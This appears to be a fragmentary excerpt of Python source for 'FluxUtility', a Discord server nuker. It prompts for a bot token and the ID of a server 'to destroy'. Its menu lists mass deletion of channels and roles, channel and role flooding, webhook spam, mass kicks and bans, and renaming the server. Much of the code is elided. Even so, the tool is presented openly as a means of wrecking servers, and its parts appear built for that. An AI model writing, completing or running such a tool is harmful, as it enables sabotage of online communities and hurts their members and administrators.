...
class Vexar:
    def __init__(self):
        ...
        os.system("title FluxUtility - Nuker Tool")
    ...
    def get_server_id(self):
        self.clear()
        self.banner()
        self.white_text("[2] Secondly, paste the ID of the Server you want to destroy:")
        while True:
            try:
    ...
    def get_bot_token(self):
        self.clear()
        self.banner()
        self.white_text("[1] First paste your bot token:")
        self.bot_token = input("--> ")

    async def start_bot(self):
        @self.bot.event
        async def on_ready():
            self.white_text(f"Bot {self.bot.user} is online and ready to DESTROY!")
    ...
    async def homemenu(self):
        while True:
            ...
            menu_options = [
                ...
                │ [01] Delete Channels             │ │ [05] Create Webhooks             │
                │ [02] Delete Roles                │ │ [06] Delete Webhooks             │
                │ [03] Create Channels             │ │ [07] Spam Webhooks               │
                │ [04] Create Roles                │ └──────────────────────────────────┘
                └──────────────────────────────────┘                                     
                ┌── MEMBERS ───────────────────────┐ ┌── SERVER ────────────────────────┐
                │ [08] Kick Members                │ │ [10] Change Server Name          │
                │ [09] Ban Members                 │ │ [00] Exit                        │
                └──────────────────────────────────┘ └──────────────────────────────────┘
"""
            ]
    ...
    async def create_webhooks(self):
        async def create_webhook(channel):
            await channel.create_webhook(name=" FluxUtility Nuker")
